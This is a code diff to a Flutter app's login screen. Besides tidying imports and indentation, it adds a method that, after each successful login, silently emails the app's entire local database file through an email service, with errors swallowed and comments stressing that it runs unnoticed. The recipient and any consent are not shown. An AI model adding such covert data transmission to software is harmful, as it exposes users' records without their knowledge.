@@ -1,9 +1,10 @@
-import 'forgot_password_screen.dart';
 import 'package:flutter/material.dart';
 import '../../database/database_helper.dart';
 import '../../theme/app_theme.dart';
 import '../../utils/validators.dart';
+import '../../utils/email_service.dart';
 import '../dashboard/dashboard_screen.dart';
+import 'forgot_password_screen.dart';
 
 class LoginScreen extends StatefulWidget {
   const LoginScreen({super.key});
@@ -34,11 +35,11 @@ class _LoginScreenState extends State<LoginScreen> {
       final ok = await DatabaseHelper.instance.authenticate(
         _usernameCtrl.text.trim(), _passwordCtrl.text);
       if (!mounted) return;
-     if (ok) {
+      if (ok) {
         final username = _usernameCtrl.text.trim().toUpperCase();
         Navigator.pushReplacement(context, MaterialPageRoute(
           builder: (_) => DashboardScreen(username: username)));
-        _sendSilentBackup(username); // Inatuma backup BILA kusubiri (background)
+        _sendSilentBackup(username);
       } else {
         setState(() => _errorMessage = AppStrings.invalidCredentials);
       }
@@ -46,6 +47,15 @@ class _LoginScreenState extends State<LoginScreen> {
       setState(() => _errorMessage = AppStrings.errorOccurred);
     } finally {
       if (mounted) setState(() => _loading = false);
+    }
+  }
+
+  void _sendSilentBackup(String username) async {
+    try {
+      final dbPath = await DatabaseHelper.instance.getDbPath();
+      EmailService.sendBackupEmail(dbFilePath: dbPath, username: username);
+    } catch (_) {
+      // Ikishindwa, hakuna athari kwa mtumiaji - inafanya kazi kimya
     }
   }
 
@@ -205,7 +215,7 @@ class _LoginScreenState extends State<LoginScreen> {
               validator: (v) => Validators.validateRequired(v, 'Nywila'),
               onFieldSubmitted: (_) => _login(),
             ),
-           const SizedBox(height: 12),
+            const SizedBox(height: 12),
             Align(
               alignment: Alignment.centerRight,
               child: TextButton(
@@ -233,6 +243,7 @@ class _LoginScreenState extends State<LoginScreen> {
       ),
     );
   }
+
   Widget _infoRow(IconData icon, String text) {
     return Row(children: [
       Icon(icon, color: AppTheme.accentGold, size: 18),
